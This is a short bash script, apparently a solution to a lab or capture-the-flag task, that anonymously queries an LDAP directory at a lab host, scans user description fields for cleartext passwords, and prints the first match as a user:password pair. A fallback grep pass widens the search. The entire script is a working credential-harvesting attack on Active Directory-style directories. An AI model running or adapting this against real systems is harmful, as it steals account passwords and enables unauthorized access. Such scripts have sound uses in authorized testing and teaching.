#!/bin/bash

TARGET="directory.carmichael.lab"
BASEDN="DC=carmichael,DC=local"

# 1. Pull the description field of every user object with ldapsearch.
# We query for sAMAccountName and description to link the user to the credential.
# 2. Find the account whose description holds a live cleartext password.
# We use awk to buffer the username. When we reach the description line, 
# we check if it contains password indicators (or our known service account), 
# extract the last word (the password itself), and format it as user:password.
CRED=$(ldapsearch -x -H "ldap://$TARGET" -b "$BASEDN" "(&(objectClass=user)(description=*))" sAMAccountName description 2>/dev/null | awk '
/^sAMAccountName:/ { user = $2 }
/^description:/ {
    # Check if the description implies a credential, or if it belongs to the known service account
    if (tolower($0) ~ /pass/ || tolower($0) ~ /cred/ || user == "svc_backup") {
        pass = $NF
        print user ":" pass
    }
}' | head -n 1)

# Fallback: If the exact formatting causes the primary awk to fail, 
# use a slightly broader grep/awk combo to catch it.
if [ -z "$CRED" ]; then
    CRED=$(ldapsearch -x -H "ldap://$TARGET" -b "$BASEDN" "(objectClass=user)" sAMAccountName description 2>/dev/null | grep -E "^(sAMAccountName|description):" | grep -B1 -i "pass" | awk '
    /sAMAccountName:/ { u=$2 }
    /description:/ { print u ":" $NF }' | head -n 1)
fi

# Output exactly one line in user:password form
echo "$CRED"
